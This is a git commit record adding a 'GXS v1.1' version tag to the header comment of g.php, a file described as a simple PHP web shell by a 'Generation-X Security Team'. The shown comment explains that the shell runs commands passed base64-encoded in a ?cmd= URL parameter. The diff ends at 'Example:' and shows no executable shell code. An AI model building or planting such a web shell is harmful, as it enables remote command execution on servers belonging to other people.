3b7dd3a101c2d141aab05bb28405b8f8aa474312
xwh1t3r0s3 <xwh1t3r0s3@users.noreply.github.com>
2016-10-24 01:46:37 +0900

    g.php got improved :)

--- g.php
+++ g.php
@@ -1,7 +1,9 @@
 <?php
 
-/*	This is a simple php shell coded by Wh1t3R0s3 of Generation-X Security Team,
- *
+/*	GXS v1.1
+ 	
+ 	This is a simple php shell coded by Wh1t3R0s3 of Generation-X Security Team,
+ 
 	to use it just add ?cmd=[command that it is in base64 encryption] at the end of the link.
 
 	Example:
